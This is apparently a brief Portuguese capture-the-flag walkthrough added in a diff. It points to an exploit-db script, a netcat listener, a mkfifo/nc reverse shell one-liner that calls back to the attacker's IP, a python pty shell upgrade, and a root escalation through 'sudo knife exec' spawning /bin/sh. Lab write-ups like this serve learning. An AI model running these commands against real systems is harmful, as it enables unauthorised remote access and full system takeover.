@@ -1,0 +1,15 @@
+Usar o script https://www.exploit-db.com/exploits/49933
+
+usar na minha maquina: nc -vlp 4242
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.145 4242 >/tmp/f
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+pegar a user flag 
+
+usar o comando echo "glrn" >> exec
+
+sudo knife exec --exec "exec '/bin/sh -i' "
+
+e viramos root
